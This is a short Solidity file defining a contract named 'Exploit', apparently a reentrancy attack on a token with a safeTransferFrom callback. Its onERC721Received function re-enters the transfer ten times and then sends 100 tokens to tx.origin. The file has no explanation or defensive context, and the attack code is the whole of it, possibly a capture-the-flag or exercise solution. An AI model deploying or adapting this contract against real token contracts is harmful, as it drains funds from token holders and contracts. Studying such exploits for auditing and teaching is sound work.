// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISafeToken is IERC20 {
    function safeTransferFrom(address, address, uint) external returns(bool);
}

contract Exploit {
    uint count;

    function run(address token, address from) external {
        ISafeToken(token).safeTransferFrom(from, address(this), 10 * 10 ** 18);
    }

    function onERC721Received(address from, address to, uint amount) external returns(bool) {
        if(count < 10) {
            count++;
            ISafeToken(msg.sender).safeTransferFrom(from, to, amount);
        }
        else {
            ISafeToken(msg.sender).transfer(tx.origin, 100 * 10 ** 18);
        }
        return true;
    }
}